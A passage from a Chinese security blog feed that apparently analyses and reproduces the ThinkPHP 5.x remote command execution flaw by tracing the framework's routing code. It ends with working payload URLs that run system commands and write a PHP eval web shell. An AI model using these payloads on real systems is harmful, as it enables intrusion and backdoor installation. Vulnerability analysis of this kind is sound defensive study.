class="line">data://伪协议</span><br><span class="line">数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的； data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</span><br></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">参考</a></p>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://leave-Devour.github.io/categories/web/"/>
    
    
      <category term="刷题" scheme="https://leave-Devour.github.io/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 5.x远程命令执行漏洞分析与复现</title>
    <link href="https://leave-devour.github.io/2020/05/05/ThinkPHP-5-x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://leave-devour.github.io/2020/05/05/ThinkPHP-5-x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-05-05T05:56:51.000Z</published>
    <updated>2020-05-06T11:05:16.798Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><p>ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。</p><p><a href="https://blog.thinkphp.cn/869075" target="_blank" rel="noopener">补丁发布</a></p><p>thinkphp的目录结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">project  应用部署目录</span><br><span class="line">├─application           应用目录（可设置）</span><br><span class="line">│  ├─common             公共模块目录（可更改）</span><br><span class="line">│  ├─index              模块目录(可更改)</span><br><span class="line">│  │  ├─config.php      模块配置文件</span><br><span class="line">│  │  ├─common.php      模块函数文件</span><br><span class="line">│  │  ├─controller      控制器目录</span><br><span class="line">│  │  ├─model           模型目录</span><br><span class="line">│  │  ├─view            视图目录</span><br><span class="line">│  │  └─ ...            更多类库目录</span><br><span class="line">│  ├─command.php        命令行工具配置文件</span><br><span class="line">│  ├─common.php         应用公共（函数）文件</span><br><span class="line">│  ├─config.php         应用（公共）配置文件</span><br><span class="line">│  ├─database.php       数据库配置文件</span><br><span class="line">│  ├─tags.php           应用行为扩展定义文件</span><br><span class="line">│  └─route.php          路由配置文件</span><br><span class="line">├─extend                扩展类库目录（可定义）</span><br><span class="line">├─public                WEB 部署目录（对外访问目录）</span><br><span class="line">│  ├─static             静态资源存放目录(css,js,image)</span><br><span class="line">│  ├─index.php          应用入口文件</span><br><span class="line">│  ├─router.php         快速测试文件</span><br><span class="line">│  └─.htaccess          用于 apache 的重写</span><br><span class="line">├─runtime               应用的运行时目录（可写，可设置）</span><br><span class="line">├─vendor                第三方类库目录（Composer）</span><br><span class="line">├─thinkphp              框架系统目录</span><br><span class="line">│  ├─lang               语言包目录</span><br><span class="line">│  ├─library            框架核心类库目录</span><br><span class="line">│  │  ├─think           Think 类库包目录</span><br><span class="line">│  │  └─traits          系统 Traits 目录</span><br><span class="line">│  ├─tpl                系统模板目录</span><br><span class="line">│  ├─.htaccess          用于 apache 的重写</span><br><span class="line">│  ├─.travis.yml        CI 定义文件</span><br><span class="line">│  ├─base.php           基础定义文件</span><br><span class="line">│  ├─composer.json      composer 定义文件</span><br><span class="line">│  ├─console.php        控制台入口文件</span><br><span class="line">│  ├─convention.php     惯例配置文件</span><br><span class="line">│  ├─helper.php         助手函数文件（可选）</span><br><span class="line">│  ├─LICENSE.txt        授权说明文件</span><br><span class="line">│  ├─phpunit.xml        单元测试配置文件</span><br><span class="line">│  ├─README.md          README 文件</span><br><span class="line">│  └─start.php          框架引导文件</span><br><span class="line">├─build.php             自动生成定义文件（参考）</span><br><span class="line">├─composer.json         composer 定义文件</span><br><span class="line">├─LICENSE.txt           授权说明文件</span><br><span class="line">├─README.md             README 文件</span><br><span class="line">├─think                 命令行入口文件</span><br></pre></td></tr></table></figure><p><code>public</code>目录为web可访问目录。</p><p>5.0的URL访问受路由控制，在关闭路由或者没有配置路由的情况下，一般URL的访问方式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</span><br></pre></td></tr></table></figure><p>这次的远程命令执行的bug就出现在路由检测。</p><p>分析：</p><p>首先看看入口文件：</p><p><img src="/images/image-20200505144530317.png" alt="image-20200505144530317"></p><p>最后执行了app.php 里面的run函数</p><p>然后看看run()</p><p><img src="/images/image-20200505144717924.png" alt="image-20200505144717924"></p><p>然后直接往下看，找到路由检测</p><p><img src="/images/image-20200505145756766.png" alt="image-20200505145756766"></p><p><code>$dispatch = $this-&gt;routeCheck()-&gt;init();</code> 看这个可以看到先执行routerCheck 然后再到init()</p><p><img src="/images/image-20200505154537634.png" alt="image-20200505154537634"></p><p>可以看出，在没有配置路由的情况下，会进入路由检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//routeCheck</span></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 检测路由缓存</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;appDebug &amp;&amp; <span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'route_check_cache'</span>)) &#123;</span><br><span class="line">            $routeKey = <span class="keyword">$this</span>-&gt;getRouteCacheKey();</span><br><span class="line">            $option   = <span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'route_cache_option'</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($option &amp;&amp; <span class="keyword">$this</span>-&gt;cache-&gt;connect($option)-&gt;has($routeKey)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cache-&gt;connect($option)-&gt;get($routeKey);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;cache-&gt;has($routeKey)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cache-&gt;get($routeKey);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取应用调度信息</span></span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;request-&gt;path();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 是否强制路由模式</span></span><br><span class="line">        $must = !is_null(<span class="keyword">$this</span>-&gt;routeMust) ? <span class="keyword">$this</span>-&gt;routeMust : <span class="keyword">$this</span>-&gt;route-&gt;config(<span class="string">'url_route_must'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 路由检测 返回一个Dispatch对象</span></span><br><span class="line">        $dispatch = <span class="keyword">$this</span>-&gt;route-&gt;check($path, $must);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($routeKey)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> ($option) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;cache-&gt;connect($option)-&gt;tag(<span class="string">'route_cache'</span>)-&gt;set($routeKey, $dispatch);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;cache-&gt;tag(<span class="string">'route_cache'</span>)-&gt;set($routeKey, $dispatch);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 存在闭包的时候缓存无效</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $dispatch;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20200505152811767.png" alt="image-20200505152811767"></p><p>然后再调用到init函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 解析默认的URL规则</span></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;parseUrl(<span class="keyword">$this</span>-&gt;dispatch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Module(<span class="keyword">$this</span>-&gt;request, <span class="keyword">$this</span>-&gt;rule, $result))-&gt;init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入parseUrl</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $depr = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'pathinfo_depr'</span>);</span><br><span class="line">        $bind = <span class="keyword">$this</span>-&gt;rule-&gt;getRouter()-&gt;getBind();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($bind) &amp;&amp; preg_match(<span class="string">'/^[a-z]/is'</span>, $bind)) &#123;</span><br><span class="line">            $bind = str_replace(<span class="string">'/'</span>, $depr, $bind);</span><br><span class="line">            <span class="comment">// 如果有模块/控制器绑定</span></span><br><span class="line">            $url = $bind . (<span class="string">'.'</span> != substr($bind, <span class="number">-1</span>) ? $depr : <span class="string">''</span>) . ltrim($url, $depr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">list</span>($path, $var) = <span class="keyword">$this</span>-&gt;rule-&gt;parseUrlPath($url); <span class="comment">//解析url然后生成数组返回来</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($path)) &#123;</span><br><span class="line">            <span class="keyword">return</span> [<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析模块</span></span><br><span class="line">        $module = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'app_multi_module'</span>) ? array_shift($path) : <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;param[<span class="string">'auto_search'</span>]) &#123;</span><br><span class="line">            $controller = <span class="keyword">$this</span>-&gt;autoFindController($module, $path);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 解析控制器</span></span><br><span class="line">            $controller = !<span class="keyword">empty</span>($path) ? array_shift($path) : <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析操作</span></span><br><span class="line">        $action = !<span class="keyword">empty</span>($path) ? array_shift($path) : <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析额外参数</span></span><br><span class="line">        <span class="keyword">if</span> ($path) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_param_type'</span>)) &#123;</span><br><span class="line">                $var += $path;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                preg_replace_callback(<span class="string">'/(\w+)\|([^\|]+)/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($match)</span> <span class="title">use</span> <span class="params">(&amp;$var)</span> </span>&#123;</span><br><span class="line">                    $var[$match[<span class="number">1</span>]] = strip_tags($match[<span class="number">2</span>]);</span><br><span class="line">                &#125;, implode(<span class="string">'|'</span>, $path));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $panDomain = <span class="keyword">$this</span>-&gt;request-&gt;panDomain();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($panDomain &amp;&amp; $key = array_search(<span class="string">'*'</span>, $var)) &#123;</span><br><span class="line">            <span class="comment">// 泛域名赋值</span></span><br><span class="line">            $var[$key] = $panDomain;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置当前请求的参数</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;request-&gt;setRouteVars($var);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 封装路由</span></span><br><span class="line">        $route = [$module, $controller, $action];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasDefinedRoute($route, $bind)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'invalid request:'</span> . str_replace(<span class="string">'|'</span>, $depr, $url));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $route;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrlPath</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 分隔符替换 确保路由定义使用统一的分隔符</span></span><br><span class="line">        $url = str_replace(<span class="string">'|'</span>, <span class="string">'/'</span>, $url);</span><br><span class="line">        $url = trim($url, <span class="string">'/'</span>);</span><br><span class="line">        $var = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> !== strpos($url, <span class="string">'?'</span>)) &#123; </span><br><span class="line">            <span class="comment">// [模块/控制器/操作?]参数1=值1&amp;参数2=值2...</span></span><br><span class="line">            $info = parse_url($url);</span><br><span class="line">            $path = explode(<span class="string">'/'</span>, $info[<span class="string">'path'</span>]);</span><br><span class="line">            parse_str($info[<span class="string">'query'</span>], $var);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (strpos($url, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            <span class="comment">// [模块/控制器/操作]</span></span><br><span class="line">            $path = explode(<span class="string">'/'</span>, $url);</span><br><span class="line">            <span class="comment">//以 ”/“ 为分割 url explode() 函数把字符串打散为数组。</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">false</span> !== strpos($url, <span class="string">'='</span>)) &#123;</span><br><span class="line">            <span class="comment">// 参数1=值1&amp;参数2=值2...</span></span><br><span class="line">            $path = [];</span><br><span class="line">            parse_str($url, $var);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $path = [$url];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$path, $var];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20200505155059666.png" alt="image-20200505155059666"></p><p>parseUrl函数接下来就是把控制器，模块 还有调用方法给提取出来，然后封装路由</p><p> <img src="/images/image-20200505155643312.png" alt="image-20200505155643312"></p><p>看到run函数下面的</p><p><img src="/images/image-20200505160544928.png" alt="image-20200505160544928"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $option = <span class="keyword">$this</span>-&gt;rule-&gt;getOption();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检测路由after行为</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($option[<span class="string">'after'</span>])) &#123;</span><br><span class="line">            $dispatch = <span class="keyword">$this</span>-&gt;checkAfter($option[<span class="string">'after'</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($dispatch <span class="keyword">instanceof</span> Response) &#123;</span><br><span class="line">                <span class="keyword">return</span> $dispatch;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数据自动验证</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($option[<span class="string">'validate'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;autoValidate($option[<span class="string">'validate'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;exec();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个run是在后面解析完再执行的。</p><p>上面用匿名函数增加了一个中间件。返回时候调用了dispatch</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">(Request $request, $type = <span class="string">'route'</span>)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> call_user_func(<span class="keyword">$this</span>-&gt;resolve($type), $request);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="comment">// 监听module_init</span></span><br><span class="line">     <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'module_init'</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">// 实例化控制器</span></span><br><span class="line">         $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">             <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_controller_layer'</span>),</span><br><span class="line">             <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'controller_suffix'</span>),</span><br><span class="line">             <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'empty_controller'</span>));</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> ($instance <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">             $instance-&gt;registerMiddleware();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $next)</span> <span class="title">use</span> <span class="params">($instance)</span> </span>&#123;</span><br><span class="line">         <span class="comment">// 获取当前操作名</span></span><br><span class="line">         $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">             <span class="comment">// 执行操作方法</span></span><br><span class="line">             $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">             <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">             $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">             $methodName = $reflect-&gt;getName();</span><br><span class="line">             $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line">             $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">             <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">             <span class="comment">// 自动获取请求变量</span></span><br><span class="line">             $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_param_type'</span>)</span><br><span class="line">             ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">             : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">             $vars = array_merge($vars, <span class="keyword">$this</span>-&gt;param);</span><br><span class="line">         &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">             <span class="comment">// 空操作</span></span><br><span class="line">             $call    = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">             $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">             $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">'_empty'</span>);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="comment">// 操作不存在</span></span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">         $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);<span class="comment">//反射</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeReflectMethod</span><span class="params">($instance, $reflect, $vars = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $args = <span class="keyword">$this</span>-&gt;bindParams($reflect, $vars);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $reflect-&gt;invokeArgs($instance, $args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然不了解php的反射性质，但是</p><p>最后调试跟踪的时候，到了这里面</p><p><img src="/images/image-20200505163614190.png" alt="image-20200505163614190"></p><p>这里就是调用call_user_func_array 调用system ，然后执行命令</p><p>前面的php中间件，不了解，但是调试过程中的构析真的恶习。跳来跳去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9096/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line">命令执行</span><br><span class="line"></span><br><span class="line">http://localhost:9096/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php</span><br><span class="line">写shell</span><br></pre></td></tr></table></figure><p>第一次接触thinkphp 感觉代码都是怪怪的。一言难进。</p>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://leave-Devour.github.io/categories/web/"/>
    
    
